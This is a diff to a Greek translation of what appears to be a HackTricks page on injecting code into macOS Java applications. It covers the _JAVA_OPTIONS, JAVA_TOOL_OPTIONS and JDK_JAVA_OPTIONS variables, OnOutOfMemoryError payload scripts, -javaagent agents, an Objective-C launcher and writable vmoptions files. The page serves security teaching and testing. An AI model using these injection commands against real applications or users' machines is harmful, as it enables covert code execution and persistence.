@@ -4,7 +4,7 @@
 
 ## Enumeration
 
-Βρείτε τις Java applications που είναι εγκατεστημένες στο σύστημά σας. Έχει παρατηρηθεί ότι οι Java apps στο **Info.plist** περιέχουν ορισμένες Java parameters που περιέχουν το string **`java.`**, επομένως μπορείτε να αναζητήσετε αυτό:
+Εντοπίστε τις Java applications που είναι εγκατεστημένες στο σύστημά σας. Παρατηρήθηκε ότι οι Java apps στο **Info.plist** περιέχουν ορισμένες java parameters που περιλαμβάνουν το string **`java.`**, επομένως μπορείτε να πραγματοποιήσετε αναζήτηση για αυτό:
 ```bash
 # Search only in /Applications folder
 sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
@@ -14,13 +14,20 @@ sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
 ```
 ## \_JAVA_OPTIONS
 
-Η μεταβλητή περιβάλλοντος **`_JAVA_OPTIONS`** μπορεί να χρησιμοποιηθεί για την εισαγωγή αυθαίρετων παραμέτρων Java VM κατά την εκκίνηση μιας εφαρμογής Java.<sup>[[1]](#references)</sup>
+Η μεταβλητή περιβάλλοντος **`_JAVA_OPTIONS`** μπορεί να χρησιμοποιηθεί για την έγχυση αυθαίρετων παραμέτρων Java VM κατά την εκκίνηση μιας Java εφαρμογής.<sup>[[1]](#references)</sup>
+
+Το Java launch stack αναγνωρίζει επίσης δύο καλύτερα καθορισμένες μεταβλητές με διαφορετικό scope:
+
+- Η `JAVA_TOOL_OPTIONS` διαβάζεται όταν δημιουργείται το VM, συμπεριλαμβανομένων ορισμένων embedded launch paths που δεν περνούν από τον `java` launcher. Μπορεί να εγχύσει instrumentation options όπως `-javaagent`, `-agentlib` ή `-agentpath`.<sup>[[4]](#references)</sup>
+- Η `JDK_JAVA_OPTIONS` προστίθεται από τον `java` launcher στην command line του. Οι options που επιλέγουν την main class ή τερματίζουν τον launcher απαγορεύονται, αλλά το `-javaagent` γίνεται αποδεκτό.<sup>[[5]](#references)</sup>
+
+Και οι τρεις μεταβλητές θα πρέπει να αντιμετωπίζονται ως controls για εκτέλεση κώδικα JVM όταν ένας attacker μπορεί επίσης να παρέχει έναν συμβατό, αναγνώσιμο agent. Το `_JAVA_OPTIONS` αποτελεί implementation detail του HotSpot, επομένως επικυρώστε το έναντι του ακριβούς vendor και version· τα `JAVA_TOOL_OPTIONS` ή `JDK_JAVA_OPTIONS` είναι προτιμότερα για portable testing.
 ```bash
 # Write your payload in a script called /tmp/payload.sh
 export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
 ```
-Για να το εκτελέσετε ως νέα διεργασία και όχι ως θυγατρική της τρέχουσας διεργασίας του terminal, μπορείτε να χρησιμοποιήσετε:
+Για να το εκτελέσετε ως νέα διεργασία και όχι ως child της τρέχουσας terminal, μπορείτε να χρησιμοποιήσετε:
 ```objectivec
 #import <Foundation/Foundation.h>
 // clang -fobjc-arc -framework Foundation invoker.m -o invoker
@@ -73,7 +80,7 @@ NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary
 return 0;
 }
 ```
-Ωστόσο, αυτή η τεχνική προκαλεί ένα σφάλμα στην εφαρμογή που εκτελείται. Μια πιο stealthy εναλλακτική είναι να δημιουργήσετε έναν Java agent και να χρησιμοποιήσετε το `-javaagent`:<sup>[[2]](#references)</sup>
+Ωστόσο, αυτή η τεχνική προκαλεί σφάλμα στην εφαρμογή που εκτελείται. Μια πιο stealthy εναλλακτική είναι να δημιουργήσετε ένα Java agent και να χρησιμοποιήσετε το `-javaagent`:<sup>[[2]](#references)</sup>
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -81,11 +88,17 @@ export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 # Or
 
 open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
+
+# The same agent with the standardized VM initialization variable:
+JAVA_TOOL_OPTIONS='-javaagent:/tmp/Agent.jar' java -jar /path/to/application.jar
+
+# Or through the JDK java launcher:
+JDK_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar' java -jar /path/to/application.jar
 ```
 > [!CAUTION]
-> Η δημιουργία του agent με **διαφορετική έκδοση Java** από αυτήν της εφαρμογής μπορεί να προκαλέσει crash τόσο στον agent όσο και στην εφαρμογή.
+> Η δημιουργία του agent με **διαφορετική έκδοση Java** από αυτήν της εφαρμογής μπορεί να προκαλέσει crash τόσο στο agent όσο και στην εφαρμογή.
 
-Όπου ο agent μπορεί να βρίσκεται:
+Όπου το agent μπορεί να είναι:
 ```java:Agent.java
 import java.io.*;
 import java.lang.instrument.*;
@@ -102,7 +115,7 @@ err.printStackTrace();
 }
 }
 ```
-Για να κάνετε compile τον agent, εκτελέστε:
+Για να κάνετε compile το agent, εκτελέστε:
 ```bash
 javac Agent.java # Create Agent.class
 jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
@@ -123,14 +136,14 @@ export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
 
 open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
 ```
-## αρχείο vmoptions
+## Αρχείο vmoptions
 
-Αυτό το αρχείο υποστηρίζει τον καθορισμό **παραμέτρων Java** κατά την εκτέλεση της Java. Μπορείτε να χρησιμοποιήσετε ορισμένες από τις προηγούμενες τεχνικές για να αλλάξετε τις παραμέτρους Java και να **κάνετε τη διεργασία να εκτελεί αυθαίρετες εντολές**.\
-Επιπλέον, αυτό το αρχείο μπορεί επίσης να **συμπεριλάβει άλλα αρχεία** με την οδηγία `include`, επομένως μπορείτε να αλλάξετε και ένα αρχείο που περιλαμβάνεται.
+Αυτό το αρχείο υποστηρίζει τον καθορισμό **παραμέτρων Java** κατά την εκτέλεση της Java. Μπορείτε να χρησιμοποιήσετε ορισμένες από τις προηγούμενες τεχνικές για να αλλάξετε τις παραμέτρους Java και να **κάνετε τη διεργασία να εκτελέσει αυθαίρετες εντολές**.\
+Επιπλέον, αυτό το αρχείο μπορεί επίσης να **περιλαμβάνει άλλα αρχεία** με την οδηγία `include`, επομένως μπορείτε να αλλάξετε και ένα αρχείο που περιλαμβάνεται.
 
-Ακόμη περισσότερο, ορισμένες εφαρμογές Java θα **φορτώσουν περισσότερα από ένα** αρχείο `vmoptions`.
+Ακόμη περισσότερο, ορισμένες εφαρμογές Java θα **φορτώσουν περισσότερα από ένα** αρχεία `vmoptions`.
 
-Ορισμένες εφαρμογές, όπως το Android Studio, υποδεικνύουν στο **output πού αναζητούν** αυτά τα αρχεία:<sup>[[3]](#references)</sup>
+Ορισμένες εφαρμογές, όπως το Android Studio, υποδεικνύουν στην **έξοδό τους πού αναζητούν** αυτά τα αρχεία:<sup>[[3]](#references)</sup>
 ```bash
 /Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions
 
@@ -149,11 +162,13 @@ sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
 # Launch the Java app
 /Applications/Android\ Studio.app/Contents/MacOS/studio
 ```
-Παρατηρήστε ότι το Android Studio σε αυτό το παράδειγμα προσπαθεί να φορτώσει το **`/Applications/Android Studio.app.vmoptions`**, μια τοποθεσία όπου οποιοσδήποτε χρήστης στην ομάδα **`admin` έχει δικαιώματα εγγραφής**.
+Σημειώστε ότι το Android Studio σε αυτό το παράδειγμα προσπαθεί να φορτώσει το **`/Applications/Android Studio.app.vmoptions`**, μια τοποθεσία στην οποία οποιοσδήποτε χρήστης στην ομάδα **`admin` έχει δικαιώματα εγγραφής**.
 
 ## References
 
 - [1] [OpenJDK — Ανάλυση του `_JAVA_OPTIONS` στο `arguments.cpp`](https://cr.openjdk.org/~never/bsd_headers/src/share/vm/runtime/arguments.cpp.html)
-- [2] [Oracle Java — Προδιαγραφή του package `java.lang.instrument`](https://docs.oracle.com/javase/8/docs/api/java/lang/instrument/package-summary.html)
+- [2] [Oracle Java — Προδιαγραφή του πακέτου `java.lang.instrument`](https://docs.oracle.com/javase/8/docs/api/java/lang/instrument/package-summary.html)
 - [3] [JetBrains — Διαμόρφωση επιλογών JVM και ιδιοτήτων πλατφόρμας](https://intellij-support.jetbrains.com/hc/en-us/articles/206544869-Configuring-JVM-options-and-platform-properties)
+- [4] [Oracle Java — `JAVA_TOOL_OPTIONS`](https://docs.oracle.com/javase/8/docs/technotes/guides/troubleshoot/envvars002.html)
+- [5] [Ο launcher `java` — `JDK_JAVA_OPTIONS`](https://docs.oracle.com/en/java/javase/25/docs/specs/man/java.html#using-the-jdk_java_options-launcher-environment-variable)
 {{#include ../../../banners/hacktricks-training.md}}
